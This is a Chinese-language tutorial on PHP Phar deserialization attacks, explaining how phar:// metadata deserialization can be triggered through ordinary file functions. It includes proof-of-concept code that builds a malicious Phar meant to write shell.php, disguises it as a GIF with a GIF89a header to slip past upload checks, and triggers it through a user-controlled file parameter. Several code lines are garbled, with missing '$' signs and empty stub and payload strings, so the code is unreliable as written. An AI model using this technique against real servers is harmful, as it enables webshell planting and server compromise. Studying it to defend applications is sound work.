Phar 反序列化漏洞

什么是 Phar 文件？

Phar (PHP Archive) 是PHP的归档文件格式，类似于Java的Jar。一个Phar文件可以包含多个文件内容，并且可以被PHP直接包含执行。

Phar 文件结构

Stub (存根)

Phar文件头部标识，包含PHP代码，指定入口文件。如

Manifest (清单)

包含文件中各个文件的元数据，其中的metadata会被自动反序列化

文件内容

实际包含的文件内容，可以是任意PHP代码或资源文件

签名

Phar文件末尾的签名，用于验证文件完整性（可选）

[Stub] // 文件标识
[Manifest] metadata // 触发反序列化的关键！
[Content] file1.php file2.php // 文件内容
[Signature] abc123 // 签名

Phar 反序列化漏洞原理

核心漏洞点

PHP通过 phar:// 伪协议访问Phar文件时，会自动反序列化Manifest中的metadata数据。

更可怕的是：不仅仅是unserialize()，所有处理文件的函数，只要参数可控并使用 phar:// 协议，都可以触发！

受影响的文件操作函数

file_get_contents() fopen() file() include() require() is_dir() file_exists() filesize() readfile() stat() copy() unlink()

Phar 反序列化利用条件

1

目标服务器允许上传Phar文件

可以通过头像上传、文件上传等功能上传恶意Phar文件

2

存在可利用的类

服务器端存在可以通过POP链触发危险操作的类（如自定义类或PHP内置类）

3

文件操作函数参数可控

有地方可以控制文件操作函数的参数，使其使用 phar:// 协议

利用技巧：伪装图片绕过上传

技巧：在Phar文件前添加 GIF89a 文件头，可以伪装成GIF图片，绕过文件上传类型检测。

1. 生成恶意Phar文件 


// 创建恶意类
class Exploit {
    public $filename;
    public $data;
    
    public function __destruct() {
        // 写入文件
        file_put_contents($this->filename, $this->data);
    }
}

// 创建Phar对象
phar = new Phar("exploit.phar");
phar->startBuffering();

// 添加恶意类到Phar
phar->setStub('');
$exploit = new Exploit();
$exploit->filename = "shell.php";
$exploit->data = '';

// 添加到manifest
phar->setMetadata($exploit);
phar->addFromString("test.txt", "test");

$phar->stopBuffering();

// 伪装成GIF
file_put_contents("exploit.gif",
    "GIF89a" . file_get_contents("exploit.phar")
);

2. 触发漏洞 


// 假设 exploit.gif 已上传到服务器
// 通过 phar:// 协议触发反序列化

file = $_GET['file'];
// 触发点：file_get_contents 可以是：
// phar://upload/exploit.gif/shell.txt

file_get_contents("phar://" . $file);

// 或者使用其他文件函数：
// include("phar://upload/exploit.gif/test.txt")
// copy("phar://upload/exploit.gif/test.txt", "out")
// is_dir("phar://upload/exploit.gif/test.txt")

Phar 协议重要特点

不需要文件包含

不像普通反序列化需要 unserialize() 被直接调用，Phar可以利用所有文件函数触发。

只要有文件操作且参数可控，就能触发Phar反序列化。

不受 allow_url_include 影响

phar:// 是PHP内置协议，不受 allow_url_include 配置限制。

即使关闭了远程文件包含，Phar反序列化依然有效。

绕过文件类型检测

添加GIF89a文件头后，可以伪装成图片文件上传。

Content-Type检测、文件头检测都能绕过。

不受限于unserialize参数

传统反序列化需要找到 unserialize($_POST['data']) 这样的入口点。

Phar只需要文件操作函数参数可控，大大扩展了攻击面。
